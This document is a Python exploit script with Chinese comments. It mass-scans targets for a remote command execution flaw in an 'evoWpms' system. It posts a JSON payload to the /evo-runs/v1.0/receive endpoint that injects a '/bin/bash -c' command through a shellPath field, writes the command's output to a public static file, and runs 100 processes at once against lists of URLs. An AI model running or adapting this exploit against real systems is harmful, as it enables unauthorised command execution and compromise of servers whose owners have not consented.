import requests
import argparse
from multiprocessing import Pool    # 导入的是子进程，为了多进程同时开启检测，提高效率，多个网站测试
from urllib.parse import quote      # quote()为了url编码，防止特殊字符影响请求
banner=r"""
 *******     ******  ********       **  ***  **  *** 
/**////**   **////**/**/////       //***//**//***//**
/**   /**  **    // /**             ///  //  ///  // 
/*******  /**       /*******                         
/**///**  /**       /**////         Owner:JY-666-YINZI                 
/**  //** //**    **/**             Version:1.0.0                 
/**   //** //****** /********                        
//     //   //////  ////////                         
"""

# 1. 编写poc函数，传入url参数，检测url是否存在漏洞
def poc(url):                       # 用poc函数来输入url检测这个url的漏洞是否存在 
    url = url.strip()   # 去除url前后空格            
    # 加下来要将url自动补全加上协议,但是如果已经文档里文件中给了就不用，所以if判断一下
    if not url.startswith(('http://', 'https://')):
        url = "http://" + url      # 可拆换
    
    # 构造远程执行命令的json payload，将df命令结果重定向输出到static静态目录下
    payload = '{"method": "agent.ossm.mapping.config", "info": {"configure": "abcd", "filePath": "haha", "paramMap": {"shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt", "filePath": "abc"}, "requestIp": ""}}'
    
    hosts = url.replace("https://", "").replace("http://", "")   # hosts是专门给头部使用的，不影响其他变量去除url中的协议，防止协议影响检测
    print(hosts)
    
    headers = {
        "Host": hosts,    # 设置变量，防止协议影响检测
        "Accept-Encoding": "gzip",
        "Connection": "keep-alive",
        "Content-Length": "249", # 对应payload长度，防止发包被拦截
        "Content-Type": "application/json", # json交互格式
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
        "X-Subject-Headerflag": "ADAPT"
    }
    
    proxies = {'http': 'http://127.0.0.1:7890', 'https': 'http://127.0.0.1:7890'}   # 设置代理，方便联动本地抓包调试
    url = url.replace(" ", "")   # 去除url前后空格
    
    # 1.1. 这里是构造请求路径，拼接上可能存在RCE的receive接口
    target = url + "/evo-runs/v1.0/receive"   
    print(target)    # 输出一行显示target，检测当前攻击路径拼接是否正确
    
    # 接下来写返回值判断是否能访问到
    try:
        # 1.2. 这里是构造的请求包结构和payload等，利用verify忽略自签证书
        response = requests.post(target, headers=headers, data=payload, timeout=5, proxies=proxies, verify=False)
        
        # 1.3. 这里是返回值判断是否发包成功。因为是命令写入文件，属于无回显RCE，只要回显200就代表大概率命令成功执行了
        if response.status_code == 200:   # 判断状态码是否为200成功接收
            print("[+]大概率存在漏洞，需要手工验证" + url)                  # 成功交互，输出存在漏洞提示
            print(response)
            
            # 将url写入文件中，方便后续手工探测生成的静态文件
            with open("2result.txt", 'a+', encoding='utf-8') as f: # 使用a是因为要追加写，w是覆盖写
                f.seek(0)                       # 将文件指针移动到文件开头，防止追加写时写在文件末尾
                content = f.read()                # 读取文件内容
                if content == "" or url not in content:   # 判断文件内容是否为空或者文件内容中是否包含url，防止重复写入
                    f.write(url + " 存在RCE命令执行漏洞\n")   # 将url写入文件中，方便后续手工验证
        else:
            print("[-]不存在漏洞" + url)                # 如果返回状态码不是200，说明接口不匹配，直接输出不存在
    except Exception as e:
        print(f"[!]访问异常：{e}")                    # 当连访问都报错抛出异常时，抓取报错
        
# 2. 已经写完poc函数，接下来写主函数↓
# 写主函数，调用poc函数，传入url参数
def main():
    parser = argparse.ArgumentParser(description="**公司RCE漏洞检测脚本")
    parser.add_argument("-u", "--url", help="目标url")  # 添加url参数（参数名可自定义）,是以u的形式也就是url形式，可选输入
    parser.add_argument("-f", "--file", help="目标url文件")   # 添加url文件参数（参数名可自定义）,是以f的形式也就是file形式，可选输入，否则不报错
    args = parser.parse_args()    # 解析参数：args是解析后的参数,调用parser包含的parse_args()解析参数，返回args对象
    
    if args.url:                # 如果输入了url参数，就调用poc函数，传入url参数
        poc(args.url)
    if args.file:             # 如果输入了url文件参数，就调用poc函数，传入url文件参数
        with open(args.file, 'r') as ff:
            li = []               # 创建一个空列表li：这里是为了防止url文件里有空格，所以要去除空格
            for line in ff:      # 逐行读取url文件，不用f.readlines(),因为文件就是按行读取的
                li.append(line.strip().replace("\n", ""))    # 将读取的url文件里的url去除空格，去掉换行符，然后添加到列表li中
            
            mp = Pool(100)        # 创建一个子进程资源池，可以同时开启100个进程并发检测
            mp.map(poc, li)      # 调用map函数，传入poc函数和列表li，子进程池会自动开启100个进程，每个进程会调用poc函数，传入列表li中的一个url
                                # map()的作用就是：for url in li:poc(url) 将列表li中的每个url传入poc函数，调用poc函数，传入url参数
            mp.close()          # 关闭子进程池          
            mp.join()           # 等待子进程池中的所有进程执行完毕，再继续执行主函数
    else:
        print("请提供目标'url'或'包含目标url的文件'")

# 3. 为了在命令行中运行脚本时，脚本会自动执行main()函数，所以需要在if __name__=="__main__":下执行main()函数
if __name__ == "__main__": # 主函数入口
    print(banner)
    main()   # 调用主函数
